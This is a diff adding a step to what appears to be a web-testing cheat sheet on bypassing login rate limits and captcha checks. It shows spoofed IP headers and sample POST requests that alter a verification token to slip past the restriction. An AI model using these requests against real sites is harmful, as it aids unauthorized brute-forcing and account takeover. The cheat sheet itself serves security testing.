@@ -57,3 +57,20 @@ X-Forwarded-For: 127.0.0.1
 X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 ```
+
+6. Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.
+```
+POST / HTTP 1.1
+Host: target.com
+[...]
+
+_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
+```
+Try this to bypass
+```
+POST / HTTP 1.1
+Host: target.com
+[...]
+
+_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
+```
